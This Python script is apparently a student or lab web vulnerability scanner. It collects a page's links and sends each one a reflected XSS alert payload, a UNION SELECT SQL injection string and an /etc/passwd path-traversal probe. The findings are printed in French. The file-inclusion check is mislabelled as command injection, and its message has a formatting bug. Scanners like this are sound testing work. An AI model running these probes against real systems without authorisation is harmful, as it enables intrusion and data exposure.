from bs4 import BeautifulSoup

def get_url_list(session, toCheck):
    response = session.get(toCheck)
    soup = BeautifulSoup(response.content, "html.parser")
    links = soup.find_all("a")
    url_list = []
    for link in links:
        url_list.append('/' + link.get("href"))
    return url_list

def check_vulnerabilities(session, url_list, host):
    xss_payload = '<script>alert("ok")</script>'
    sql_payload = "'+UNION+SELECT+@@VERSION,+%27OKAY%27+%23"
    cmd_payload = "../../../../../../../etc/passwd"

    for index, link in enumerate(url_list):

        # Check for XSS injection vulnerability
        url = host + "{}?name={}#".format(link, xss_payload)
        response = session.get(url)
        if xss_payload in response.text:
            print(f"- XSS injection ==> Faille XSS reflected détectée dans la page : {host}{link}")

        # Check for SQL injection vulnerability
        url = host + "{}?id={}+&Submit=Submit#".format(link, sql_payload)
        response = session.get(url)
        if 'OKAY' in response.text:
            print(f"- SQL injection ==> La base de données est accessible dans la page : {host}{link}")

        # Check for command injection vulnerability
        url = host + "{}?page={}".format(link, cmd_payload)
        response = session.get(url)
        if "root:x:0:0:root:/root:/" in response.text:
            print("- Command injection ==> Faille de l'inclusion de fichier local détectée à l'URL : http://127.0.0.1{link}")
